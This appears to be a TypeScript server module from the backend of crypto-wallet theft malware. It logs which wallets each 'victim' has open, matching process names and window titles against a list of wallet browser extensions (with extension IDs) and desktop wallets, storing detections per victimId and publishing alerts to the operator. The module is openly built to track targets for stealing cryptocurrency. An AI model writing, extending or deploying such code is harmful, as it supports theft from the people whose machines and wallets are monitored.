import { prisma } from './db';
import { publish } from './bus';

export type DetectionInput = {
  name?: string;
  pid?: number | null;
  title?: string | null;
  text?: string | null;
};

const PROVIDERS: Array<{ id: string; kind: 'extension' | 'desktop' | 'mobile' | 'unknown'; match: RegExp }> = [
  { id: 'metamask', kind: 'extension', match: /metamask|nkbihfbeogaeaoehlefnkodbefgpgknn/i },
  { id: 'phantom', kind: 'extension', match: /phantom|bfnaelmomeimhlpmgjnjophhpkkoljpa/i },
  { id: 'rabby', kind: 'extension', match: /rabby|acmacodkjbdgmoleebolmdjonilkdbch/i },
  { id: 'trust', kind: 'extension', match: /trust ?wallet|egjidjbpglichdcondbcbdfhobmdhjbm/i },
  { id: 'coinbase', kind: 'extension', match: /coinbase|hnfanknocfeofbddgcijnmhnfnkdnaad/i },
  { id: 'exodus', kind: 'desktop', match: /exodus/i },
  { id: 'electrum', kind: 'desktop', match: /electrum/i },
  { id: 'ledger', kind: 'desktop', match: /ledger ?live/i },
  { id: 'trezor', kind: 'desktop', match: /trezor/i },
  { id: 'atomic', kind: 'desktop', match: /atomic ?wallet/i },
  { id: 'bitcoin-core', kind: 'desktop', match: /bitcoin ?core/i },
  { id: 'keplr', kind: 'extension', match: /keplr/i },
  { id: 'solflare', kind: 'extension', match: /solflare/i },
  { id: 'backpack', kind: 'extension', match: /backpack/i }
];

const BROWSERS = /chrome|brave|edge|firefox|opera|vivaldi|msedge/i;

/** Provider + surface from the process/title, never trusting the agent label alone. */
export function classify(name: string, title: string): { provider: string; kind: 'extension' | 'desktop' | 'mobile' | 'unknown'; url: string | null } {
  const haystack = `${name} ${title}`;
  const found = PROVIDERS.find((provider) => provider.match.test(haystack));
  const provider = (found?.id ?? name).toLowerCase().replace(/[^a-z0-9.-]/g, '').slice(0, 32) || 'wallet';
  let kind: 'extension' | 'desktop' | 'mobile' | 'unknown' = found?.kind ?? 'unknown';
  if (kind === 'unknown' && BROWSERS.test(name)) kind = 'extension';
  const url = title.match(/https?:\/\/[^\s)]+/)?.[0].slice(0, 1024) ?? null;
  return { provider, kind, url };
}

export type DetectionResult = {
  id: string;
  victimId: string;
  provider: string;
  kind: string;
  process: string;
  window: string;
  url: string | null;
  pid: number | null;
  firstSeenAt: string;
  lastSeenAt: string;
  closedAt: string | null;
  count: number;
};

function serialize(row: {
  id: string; victimId: string; provider: string; kind: string; process: string; window: string;
  url: string | null; pid: number | null; firstSeenAt: Date; lastSeenAt: Date; closedAt: Date | null; count: number;
}): DetectionResult {
  return {
    id: row.id, victimId: row.victimId, provider: row.provider, kind: row.kind, process: row.process,
    window: row.window, url: row.url, pid: row.pid, firstSeenAt: row.firstSeenAt.toISOString(),
    lastSeenAt: row.lastSeenAt.toISOString(), closedAt: row.closedAt?.toISOString() ?? null, count: row.count
  };
}

/** Upsert by provider+window; a repeated focus bounce only bumps the counter. */
export async function detected(victimId: string, input: DetectionInput): Promise<DetectionResult | null> {
  const rawName = String(input.name ?? input.text ?? 'wallet').replace(/^wallet detected:\s*/i, '').trim();
  const pidMatch = rawName.match(/\((\d+)\)\s*$/);
  const pid = input.pid ?? (pidMatch ? Number(pidMatch[1]) : null);
  const name = rawName.replace(/\s*\(\d+\)\s*$/, '').slice(0, 64) || 'wallet';
  const title = String(input.title ?? '').slice(0, 512);
  const process = name.slice(0, 260);
  const { provider, kind, url } = classify(name, title);
  const window = (title || process || provider).slice(0, 512);
  const row = await prisma.walletDetection.upsert({
    where: { victimId_provider_window: { victimId, provider, window } },
    update: { lastSeenAt: new Date(), closedAt: null, pid, count: { increment: 1 }, url, kind, process },
    create: { victimId, provider, kind, process, window, url, pid }
  }).catch(() => null);
  if (!row) return null;
  const result = serialize(row);
  void publish({ type: 'wallet.detected', victimId, at: Date.now(), data: result as unknown as Record<string, unknown> });
  return result;
}

/** Close every open detection for the victim (or the given pid/title). */
export async function closed(victimId: string, input: { pid?: number | null; title?: string | null } = {}): Promise<void> {
  const where = {
    victimId,
    closedAt: null,
    ...(input.pid ? { pid: input.pid } : {}),
    ...(input.title ? { window: { contains: String(input.title).slice(0, 128), mode: 'insensitive' as const } } : {})
  };
  await prisma.walletDetection.updateMany({ where, data: { closedAt: new Date() } }).catch(() => undefined);
  void publish({ type: 'wallet.closed', victimId, at: Date.now(), data: { pid: input.pid ?? null } });
}

export async function active(victimId: string, sinceMs = 60 * 60_000): Promise<DetectionResult[]> {
  const rows = await prisma.walletDetection.findMany({
    where: { victimId, lastSeenAt: { gte: new Date(Date.now() - sinceMs) }, OR: [{ closedAt: null }, { closedAt: { gte: new Date(Date.now() - sinceMs) } }] },
    orderBy: { lastSeenAt: 'desc' },
    take: 24
  });
  return rows.filter((row) => !row.closedAt || row.closedAt.getTime() >= row.lastSeenAt.getTime()).map(serialize);
}
